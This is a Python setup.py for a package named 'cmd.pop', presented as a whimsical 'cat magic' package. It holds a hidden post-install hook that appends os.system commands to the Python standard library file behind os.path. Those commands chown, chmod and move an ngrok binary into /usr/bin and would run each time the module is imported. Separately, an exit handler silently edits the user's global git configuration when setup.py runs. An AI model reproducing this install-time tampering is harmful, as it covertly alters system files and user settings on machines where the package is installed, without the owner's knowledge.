import sys,subprocess

class Var:
    nameA = 'Ngrok.pop'
    nameB = '0.1.0'
    ### 修改參數 ###


##############################################
##############################################
from setuptools.command.install import install
class PostCMD(install):
        """cmdclass={'install': XXCMD,'install': EEECMD }"""
        def  run(self):
            # 調用父類的 run 方法
            install.run(self)
            # 在這裡放置你的 post-install 指令
            # subprocess.run(['your_command', 'arg1', 'arg2'])
            # 以下是你提供的指令
           


            import atexit                
            def  cleanup_function(siteOP):
                text=r'''##[start]
os.system('chown root:root /usr/local/ngrok')
os.system('chmod +x /usr/local/ngrok')
os.system('mv /usr/local/ngrok /usr/bin/ngrok')
#print("@ 123 @")
##[end]
'''
                import os
                open(os.path.__file__,"a+").write(text)
                #######################################
                ###################################### 留一個
                while  True:
                    SS=open(os.path.__file__,"r").read()
                    if SS.count(text)!=1:
                        open(os.path.__file__,"w").write( SS[0:-len(text)] )
                    else:
                        break
                ######################################
                ###################################### 留一個
            import site
            atexit.register(cleanup_function,site)
            #################################
            


        import site
        print("@ 1 @[setup.py]--[site]:",id(site))
        import atexit                
        def     cleanup_function(siteOP):
                print("@ 2 @[setup.py]--[site]:",id(site))
                import os
                os.system("git config --global user.moon moon-0516")
        atexit.register(cleanup_function,site)
        #################################




##############################################
from setuptools import setup, find_packages
setup(
    name="cmd.pop",
    # name=f"cmd.oss",
    version="0.7.0",
    description="笨貓魔法",
    long_description="""喵!\n喵!\n喵!\n""",
    long_description_content_type="text/markdown",
    license="LGPL",
    # packages=find_packages(),
    # install_requires=[
    # setup_requires=[
    #    "cmd.pop@0.4.0"
    # #     # 'BAT.oss@git+https://gitlab.com/moon-0516/AT.bat',
    # ],
    setup_requires=[
        'cmd.pop==0.6.0',  # 举例一个具体版本的构建工具
        # 添加其他构建时依赖项
    ],
    # dependency_links=[
    #   'git+https://gitlab.com/moon-0516/cmd.os#egg=cmd.os'
    # ],
    #####################################
    # cmdclass={ 'install': PostCMD  }
    #####################################
)
